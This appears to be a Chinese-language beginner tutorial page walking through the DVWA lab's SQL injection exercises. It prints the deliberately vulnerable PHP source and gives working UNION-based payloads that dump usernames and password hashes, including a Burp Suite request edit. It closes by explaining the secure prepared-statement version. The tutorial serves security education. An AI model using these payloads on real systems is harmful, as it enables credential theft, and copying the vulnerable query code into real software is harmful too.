@@ -1,0 +1,294 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>什么是SQL注入?</title>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.8/dist/katex.min.css">
+</head>
+<body>
+<div class="article-content" data-id="web-sqli">
+<div class="intro-article">
+<p><span style="color:#51cf66">欢迎来到web方向!</span></p>
+<h2>今天介绍一下入门级的漏洞 <span style="color:#ffd43b">sql injection</span></h2>
+<p>题目来自dvwa靶场的sqli练习😳</p>
+<h1>low level</h1>
+<p>源码:</p>
+<pre><code class="language-php">&lt;?php
+
+if( isset( $_REQUEST[ 'Submit' ] ) ) {
+    // Get input
+    $id = $_REQUEST[ 'id' ];
+
+    // Check database
+    $query  = &quot;SELECT first_name, last_name FROM users WHERE user_id = '$id';&quot;;
+    $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( '&lt;pre&gt;' . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '&lt;/pre&gt;' );
+
+    // Get results
+    while( $row = mysqli_fetch_assoc( $result ) ) {
+        // Get values
+        $first = $row[&quot;first_name&quot;];
+        $last  = $row[&quot;last_name&quot;];
+
+        // Feedback for end user
+        echo &quot;&lt;pre&gt;ID: {$id}&lt;br /&gt;First name: {$first}&lt;br /&gt;Surname: {$last}&lt;/pre&gt;&quot;;
+    }
+
+    mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]);
+}
+
+?&gt;
+</code></pre>
+<p>最简单的sql注入</p>
+<p>ps:你可能需要先了解一些sql语法(不过非常简单)</p>
+<blockquote>
+<p>先掌握DELETE SELECT INSERT UPDATE</p>
+</blockquote>
+<p>开始!</p>
+<p>观察到核心逻辑:</p>
+<blockquote>
+<p>SELECT first_name, last_name FROM users WHERE user_id = ‘$id’;</p>
+</blockquote>
+<p>用户输入直接拼接到SQL且无过滤，无类型检查</p>
+<p>先输入</p>
+<blockquote>
+<p>1’ OR ‘1’=‘1’ #</p>
+</blockquote>
+<p>语句变为user_id = ‘1’ OR ‘1’=‘1’ #…(被注释掉了)</p>
+<p>1=1恒真，加上or的逻辑</p>
+<p>计算机直接将该语句判定为真并返回了所有的用户名字</p>
+<p>因此存在注入点</p>
+<p>接下来看一下基本信息</p>
+<p>输入</p>
+<blockquote>
+<p>1’ UNION SELECT database(),‘a’ #</p>
+</blockquote>
+<p>返回dvwa</p>
+<p>ps:1’闭合前面语句，#注释掉后续语句,中间执行任意代码!</p>
+<p>然后获取表名</p>
+<blockquote>
+<p>1’ UNION SELECT table_name, ‘a’ FROM information_schema.tables WHERE table_schema=‘dvwa’ #</p>
+</blockquote>
+<p>得到表名</p>
+<blockquote>
+<p>users</p>
+</blockquote>
+<p>接下来我们获得列名</p>
+<blockquote>
+<p>1’ UNION SELECT column_name, ‘a’ FROM information_schema.columns WHERE table_name=‘users’ #</p>
+</blockquote>
+<p>得到列名</p>
+<blockquote>
+<p>重点:user password</p>
+</blockquote>
+<p>接下来读取敏感信息</p>
+<blockquote>
+<p>1’ UNION SELECT user,password FROM users #</p>
+</blockquote>
+<p>成功获得所有用户的密码!</p>
+<h2>medium level</h2>
+<p>源码</p>
+<pre><code class="language-php">&lt;?php
+
+if( isset( $_POST[ 'Submit' ] ) ) {
+    // Get input
+    $id = $_POST[ 'id' ];
+
+    $id = mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $id);
+
+    $query  = &quot;SELECT first_name, last_name FROM users WHERE user_id = $id;&quot;;
+    $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query) or die( '&lt;pre&gt;' . mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) . '&lt;/pre&gt;' );
+
+    // Get results
+    while( $row = mysqli_fetch_assoc( $result ) ) {
+        // Display values
+        $first = $row[&quot;first_name&quot;];
+        $last  = $row[&quot;last_name&quot;];
+
+        // Feedback for end user
+        echo &quot;&lt;pre&gt;ID: {$id}&lt;br /&gt;First name: {$first}&lt;br /&gt;Surname: {$last}&lt;/pre&gt;&quot;;
+    }
+
+}
+
+// This is used later on in the index.php page
+// Setting it here so we can close the database connection in here like in the rest of the source scripts
+$query  = &quot;SELECT COUNT(*) FROM users;&quot;;
+$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( '&lt;pre&gt;' . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '&lt;/pre&gt;' );
+$number_of_rows = mysqli_fetch_row( $result )[0];
+
+mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]);
+?&gt;
+
+</code></pre>
+<p>题目难度略微增加</p>
+<p>界面不再有表单提交</p>
+<p>改为了下拉选择(现实谁会这样😹😹)</p>
+<p>不过不影响我们利用🙈🙈</p>
+<p>观察题目逻辑为使用post传递id</p>
+<p>且关键1:</p>
+<blockquote>
+<p>SELECT first_name, last_name FROM users WHERE user_id = $id;</p>
+</blockquote>
+<p>关键2:</p>
+<blockquote>
+<p>使用了mysqli_real_escape_string,’ &quot;会被过滤</p>
+</blockquote>
+<p>既然无法输入信息</p>
+<p>那么这时候，就要拿出我们的抓包神器burpsuite了😡</p>
+<p>下载地址: <a href="https://portswigger.net/burp/communitydownload">https://portswigger.net/burp/communitydownload</a></p>
+<p>打开proxy</p>
+<p>open browser</p>
+<p>先打开intercept模式</p>
+<p>你会看到</p>
+<blockquote>
+<p>intercept is on!</p>
+</blockquote>
+<p>然后点击submit</p>
+<p>打开burpsuite查看抓包得到的信息</p>
+<p>你会看到:</p>
+<p>POST /vulnerabilities/sqli/?id=1&amp;Submit=Submit HTTP/1.1</p>
+<p>Host: localhost:8000(我随便开的端口…)</p>
+<p>…</p>
+<p>id=1&amp;Submit=Submit</p>
+<p>哈哈，在这里注入就行了吧😎😎</p>
+<p>同理(注意没有’的逻辑了)</p>
+<p>直接改为</p>
+<blockquote>
+<p>id=1 UNION SELECT user,password FROM users #&amp;Submit=Submit</p>
+</blockquote>
+<p>成功!😎</p>
+<h2>high level</h2>
+<p>源码</p>
+<pre><code class="language-php">&lt;?php
+
+if( isset( $_SESSION [ 'id' ] ) ) {
+    // Get input
+    $id = $_SESSION[ 'id' ];
+
+    // Check database
+    $query  = &quot;SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;&quot;;
+    $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( '&lt;pre&gt;Something went wrong.&lt;/pre&gt;' );
+
+    // Get results
+    while( $row = mysqli_fetch_assoc( $result ) ) {
+        // Get values
+        $first = $row[&quot;first_name&quot;];
+        $last  = $row[&quot;last_name&quot;];
+
+        // Feedback for end user
+        echo &quot;&lt;pre&gt;ID: {$id}&lt;br /&gt;First name: {$first}&lt;br /&gt;Surname: {$last}&lt;/pre&gt;&quot;;
+    }
+
+    ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);        
+}
+
+?&gt;
+</code></pre>
+<p>这次不看你的id了</p>
+<blockquote>
+<p>直接看你修改的$_SESSION[‘id’] 的值</p>
+</blockquote>
+<p>所以我们直接进入change session id的地方</p>
+<p>依旧burpsuite抓包</p>
+<p>题目逻辑还是</p>
+<blockquote>
+<p>SELECT first_name, last_name FROM users WHERE user_id = ‘$id’ LIMIT 1;</p>
+</blockquote>
+<p>payload</p>
+<blockquote>
+<p>1’ UNION SELECT user,password FROM users #&amp;Submit=Submit</p>
+</blockquote>
+<p>成功!😎</p>
+<h2>impossible level</h2>
+<p>源码</p>
+<pre><code class="language-php">&lt;?php
+
+if( isset( $_GET[ 'Submit' ] ) ) {
+    // Check Anti-CSRF token
+    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );
+
+    // Get input
+    $id = $_GET[ 'id' ];
+
+    // Was a number entered?
+    if(is_numeric( $id )) {
+        // Check the database
+        $data = $db-&gt;prepare( 'SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;' );
+        $data-&gt;bindParam( ':id', $id, PDO::PARAM_INT );
+        $data-&gt;execute();
+        $row = $data-&gt;fetch();
+
+        // Make sure only 1 result is returned
+        if( $data-&gt;rowCount() == 1 ) {
+            // Get values
+            $first = $row[ 'first_name' ];
+            $last  = $row[ 'last_name' ];
+
+            // Feedback for end user
+            echo &quot;&lt;pre&gt;ID: {$id}&lt;br /&gt;First name: {$first}&lt;br /&gt;Surname: {$last}&lt;/pre&gt;&quot;;
+        }
+    }
+}
+
+// Generate Anti-CSRF token
+generateSessionToken();
+
+?&gt;
+</code></pre>
+<p>ok观察这个源码</p>
+<p>发现:</p>
+<blockquote>
+<p>根本不可能能sql注入</p>
+</blockquote>
+<p>其实这是一次安全查询的示范</p>
+<p>学习了攻击，也要学习如何防守</p>
+<p><span style="color:#ff6b6b">为什么这个代码这么安全?</span></p>
+<ul>
+<li>
+<p>CSRF token 校验：修改请求需要合法 token（减少可直接构造的请求面）</p>
+</li>
+<li>
+<p>类型检查 is_numeric()：非数字输入直接被丢弃，不会进入查询!</p>
+</li>
+<li>
+<p>Prepared statement + bindParam(…, PDO::PARAM_INT)：即使能把输入送进查询，也会按整型绑定，无法把 SQL 片段注入进查询结构!</p>
+</li>
+<li>
+<p>LIMIT 1 + rowCount check：限制返回行数并确认只有 1 行，降低信息泄露面。</p>
+</li>
+</ul>
+<p>企业级安全中最标准的防御😎😎</p>
+<h2>最后:</h2>
+<p>sql注入不止于此</p>
+<p>题目中可能还有各种各样的注入方式亦或绕过逻辑</p>
+<blockquote>
+<p>等待着你这名hacker去attack!😎</p>
+</blockquote>
+<p>其实还有一个自动化工具叫做sqlmap</p>
+<p>不过</p>
+<p>只会使用工具是不行的(你会被称作<em>脚本小子</em>😄)</p>
+<p>最好理解其原理😎😎</p>
+<h2>小插曲</h2>
+<p>最后谈谈个人的一点小感受:(可以跳过)</p>
+<p>在短视频平台无意看到这样一句话:</p>
+<p>现在基本都不用php了，都过时了，你学这些干嘛?</p>
+<p>初看感觉似乎说的在理</p>
+<p>细思，实则不然</p>
+<p>php 并不是 web 漏洞的本质。</p>
+<p>漏洞不依赖具体哪门<strong>语言</strong>，漏洞依赖“业务+人写的代码+架构”。</p>
+<p>往更深点说</p>
+<p>SQL注入的本质其实是<strong>输入验证逻辑的缺失</strong></p>
+<p>这些东西在 go、node、java、python、ruby 依旧存在。</p>
+<p>现在我们用php这门语言学的是底层逻辑与安全思维，后面完全能<strong>迁移</strong>。</p>
+<p><em><strong>因此</strong></em></p>
+<p>完全不必焦虑或怀疑自己</p>
+<blockquote>
+<p>all your work will pay off</p>
+</blockquote>
+<p>that is end~😀</p>
+<p>感谢阅读~😀</p>
+</div>
+</div>
+</body>
+</html>
